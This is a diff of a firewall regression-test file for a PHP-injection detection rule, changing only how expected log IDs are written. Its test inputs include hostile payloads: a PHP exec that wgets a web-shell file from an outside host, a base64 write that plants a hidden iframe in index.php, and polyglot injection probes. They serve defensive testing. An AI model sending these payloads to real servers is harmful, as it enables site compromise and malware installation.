@@ -21,7 +21,8 @@ tests:
           uri: "/get?foo=<?exec('wget%20http://r57.biz/r57.txt%20-O"
           version: HTTP/1.0
         output:
-          log_contains: id "933100"
+          log:
+            expect_ids: [933100]
   - test_id: 2
     desc: PHP Injection Attack (933100) from old modsec regressions
     stages:
@@ -40,7 +41,8 @@ tests:
           uri: "/get?foo=%3C%3Fphp%20echo(%5C%22KURWA%5C%22)%3B%20file_put_contents(%5C%22.%2Findex.php%5C%22%2C%20base64_decode(%5C%22Pz48aWZyYW1lIHNyYz0iaHR0cDovL3p1by5wb2Rnb3J6Lm9yZy96dW8vZWxlbi9pbmRleC5waHAiIHdpZHRoPSIwIiBoZWlnaHQ9IjAiIGZyYW1lYm9yZGVyPSIwIj48L2lmcmFtZT48P3BocA%3D%3D%5C%22)%2C%20FILE_APPEND)%3B%20%3F%3E"
           version: HTTP/1.0
         output:
-          log_contains: id "933100"
+          log:
+            expect_ids: [933100]
   - test_id: 3
     desc: "PHP injection attack: looking for [/php] closing tag"
     stages:
@@ -55,7 +57,8 @@ tests:
           uri: "/get?foo=somePhpWouldGoHere%5B%2Fphp%5D"
           version: HTTP/1.0
         output:
-          log_contains: id "933100"
+          log:
+            expect_ids: [933100]
   - test_id: 4
     desc: 'PHP injection attack: looking for [\php] closing tag'
     stages:
@@ -70,7 +73,8 @@ tests:
           uri: "/get?foo=somePhpWouldGoHere%5B%5Cphp%5D"
           version: HTTP/1.0
         output:
-          log_contains: id "933100"
+          log:
+            expect_ids: [933100]
   - test_id: 5
     desc: |
       xml/php polyglot payload, using a PHP
@@ -87,7 +91,8 @@ tests:
           uri: "/get?foo=%3C%3Fxml%20%3Aecho%201%3B"
           version: HTTP/1.0
         output:
-          log_contains: id "933100"
+          log:
+            expect_ids: [933100]
   - test_id: 6
     desc: |
       xml/php polyglot payload, using a PHP, uppercase test
@@ -104,7 +109,8 @@ tests:
           uri: "/get?foo=%3C%3Fxml%20%3Aecho%201%3B"
           version: HTTP/1.0
         output:
-          log_contains: id "933100"
+          log:
+            expect_ids: [933100]
   - test_id: 7
     desc: |
       xml/php polyglot payload, using a PHP
@@ -121,7 +127,8 @@ tests:
           uri: "/get?foo=%3C%3Fxml%20%3AfputCSV%28%24alreadyOpenFile%2C%20array%28%22foo%22%2C%20%22bar%22%2C%20%22hello%22%2C%20%22world%22%29%29%3B"
           version: HTTP/1.0
         output:
-          log_contains: id "933100"
+          log:
+            expect_ids: [933100]
   - test_id: 8
     desc: |
       xml/php polyglot payload, using a PHP
@@ -138,4 +145,5 @@ tests:
           uri: "/get?foo=%3C%3Fxml%20%20%20%09%09%09%09%09%09%20%28%29%3Becho%201%3B"
           version: HTTP/1.0
         output:
-          log_contains: id "933100"
+          log:
+            expect_ids: [933100]
